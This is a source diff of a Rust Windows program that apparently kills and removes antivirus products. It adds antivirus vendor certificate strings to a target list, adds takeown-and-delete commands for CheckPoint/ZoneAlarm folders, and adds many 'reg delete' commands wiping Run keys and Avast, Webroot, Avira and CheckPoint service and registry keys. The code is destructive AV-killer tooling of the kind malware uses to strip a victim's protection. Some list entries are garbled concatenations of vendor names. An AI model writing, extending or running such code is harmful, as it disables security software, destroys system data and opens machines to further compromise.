@@ -170,7 +170,7 @@ fn modify_registry() -> io::Result<()> {
 
 /// List of antivirus signature substrings to search for in the certificate's subject.
 const ANTIVIRUS_LIST: &[&str] = &[
-    "System Healer Tech Sp.Zo.o",
+    "System Healer Tech Sp.Zo.o.",
     "Beijing Rising Information Technology Corporation Limited",
     "Filseclab Corporation",
     "Trend Micro, Inc.",
@@ -197,18 +197,48 @@ const ANTIVIRUS_LIST: &[&str] = &[
     "Comodo Security Solutions",
     "G DATA Software AG",
     "BullGuard Ltd.",
+    "BullGuard Ltd",
     "Bitdefender SRL",
-    "Avira Operations GmbH & Co.KG",
+    "Avira Operations GmbH &amp; Co.KG",
     "AVG Technologies CZ, s.r.o.",
     "Avast Software s.r.o.",
+    "Avast Software a.s.",
+    "System Healer Tech Sp.Zo.o.Lavasoft Limited",
     "Check Point Software Technologies Ltd.",
     "VIRUSBLOKADA ODO",
+    "Beijing Kingsoft Security software Co., Ltd",
     "Qihoo 360 Software(Beijing) Company Limited",
     "Plumbytes Software Lp",
     "Bleeping Computer, LLC.",
+    "Doctor Web",
+    "Filseclab",
+    "Trend Micro",
+    "SUPERAntiSpyware",
+    "IKARUS",
+    "Quick Heal",
+    "Panda Security",
     "Symantec Corporation",
+    "NANO",
+    "McAfee",
+    "Malwarebytes",
+    "Kaspersky",
+    "K7 Computing",
+    "FRISK",
+    "Fortinet",
+    "Emsisoft",
+    "ESET",
+    "Immunet",
+    "Comodo",
+    "G DATA",
+    "NovaShield",
+    "BullGuard",
+    "Bitdefender",
+    "Avira",
+    "AVG",
+    "Avast",
     "AhnLab",
-    "Baidu (China)",
+    "Lavasoft",
+    "System Healer Tech Sp.Zo.o.Baidu (China)",
     "Safer Networking Ltd.",
     "BrightFort LLC",
     "Gridinsoft, LLC",
@@ -217,6 +247,18 @@ const ANTIVIRUS_LIST: &[&str] = &[
     "Zemana Ltd.",
     "Piriform Ltd",
     "IObit Information Technology",
+    "Check Point",
+    "VIRUSBLOKADA",
+    "Sophos",
+    "ThreatTrack",
+    "Blue Coat",
+    "Glarysoft",
+    "SurfRight",
+    "Computer Associates International",
+    "Shanghai 2345 Network",
+    "Beijing Kingsoft Security",
+    "Beijing Rising Information",
+    "Qihoo 360 Software",
 ];
 
 /// Retrieves the subject string from the first certificate embedded in the file.
@@ -876,6 +918,24 @@ fn main() -> io::Result<()> {
             add_takeown_and_delete(&mut commands, &avast_pd);
         }
 
+        // Group 9: Delete CheckPoint (ZoneAlarm Antivirus) directories.
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let checkpoint_pf = format!(r#""{}\CheckPoint""#, prog_files);
+            add_takeown_and_delete(&mut commands, &checkpoint_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let checkpoint_pf86 = format!(r#""{}\CheckPoint""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &checkpoint_pf86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+          let checkpoint_pd = format!(r#""{}\CheckPoint""#, program_data);
+          add_takeown_and_delete(&mut commands, &checkpoint_pd);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            let harmony_pd = format!(r#""{}\!!Harmony Zero-DaySecurityData!Do not!Discard""#, program_data);
+            add_takeown_and_delete(&mut commands, &harmony_pd);
+        }
+        
         // Group 9: Kill antivirus processes
         let kill_processes_cmds = vec![
             // AVAST
@@ -936,6 +996,7 @@ fn main() -> io::Result<()> {
         let delete_registry_cmds = vec![
             // Startup keys
             r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
+            r#"reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
             // Avast-related keys
             r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f"#,
             r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f"#,
@@ -964,6 +1025,9 @@ fn main() -> io::Result<()> {
             r#"reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f"#,
             r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f"#,
             r#"reg delete "HKLM\SOFTWARE\WRData" /f"#,
+            r#"reg delete "HKCU\SOFTWARE\WOW6432Node\Webroot" /f"#,
+            r#"reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f"#,
+            r#"reg delete "HKCU\SOFTWARE\WRData" /f"#,
             r#"reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f"#,
             r#"reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f"#,
             r#"reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f"#,
@@ -994,6 +1058,13 @@ fn main() -> io::Result<()> {
             r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f"#,
             // Avira key
             r#"reg delete HKLM\SOFTWARE\AVIRA /f"#,
+            r#"reg delete HKCU\SOFTWARE\AVIRA /f"#,
+            // CheckPoint (ZoneAlarm Antivirus) 
+            r#"reg delete HKLM\SOFTWARE\CheckPoint /f"#,
+            r#"reg delete HKCU\SOFTWARE\CheckPoint /f"#,
+            r#"reg delete HKLM\SYSTEM\ControlSet001\Services\AR_Service /f"#,
+            r#"reg delete HKLM\SYSTEM\ControlSet002\Services\AR_Service /f"#,
+            r#"reg delete HKLM\SYSTEM\CurrentControlSet\Services\AR_Service /f"#,
         ];
 
         for cmd in delete_registry_cmds {
